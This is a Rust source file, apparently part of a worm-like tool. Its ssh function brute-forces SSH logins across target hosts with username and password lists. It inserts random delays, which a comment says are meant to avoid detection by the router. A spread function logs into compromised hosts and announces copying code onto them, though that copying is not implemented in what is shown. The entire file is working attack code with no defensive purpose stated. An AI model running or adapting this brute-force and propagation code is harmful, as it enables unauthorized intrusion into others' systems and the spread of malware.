 use std::net::TcpStream;
use ssh2::Session;
use std::{thread, time};
use rand::Rng;

pub fn ssh(target: &Vec<String>, usernames: &'static [&'static str], passwords: &'static [&'static str])
{
    for target in target {

        'brutessh: for user in usernames {
            // for every combination of username and password, try and ssh
            for pass in passwords {
                let tcp = TcpStream::connect(&target).unwrap();
                let mut sess = Session::new().unwrap();
                sess.set_tcp_stream(tcp);
                sess.handshake().unwrap();

                let did_it_work = sess.userauth_password(&user, &pass);

                match did_it_work { //if ssh returns OK(), then it is hackable, otherwise, it isn't
                    Err(_) => println!("failed: {} - {}/{}", &target, user, pass),
                    Ok(_) => {
                        println!("\x1b[93mHACKED {} - {}/{}\x1b[0m", &target, user, pass);
                        break 'brutessh;
                    },
                }
                thread::sleep(time::Duration::from_millis(
                    rand::thread_rng().gen_range(500..4000)
                    //use rand so router doesn't pick it up.
                ));
            }
        }
    }
}

pub fn spread(target: String, user: String, pass: String) {
    println!("\x1b[93m    Hacking...\x1b[0m");

    let tcp = TcpStream::connect(&target).unwrap();
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    let did_it_work = sess.userauth_password(&user, &pass);

    match did_it_work {
        Err(_) => println!("\x1b[93m        failed to connect!\x1b[0m"),
        Ok(_) => {
            println!("\x1b[93m        Copying code...\x1b[0m");
        },
    }
}
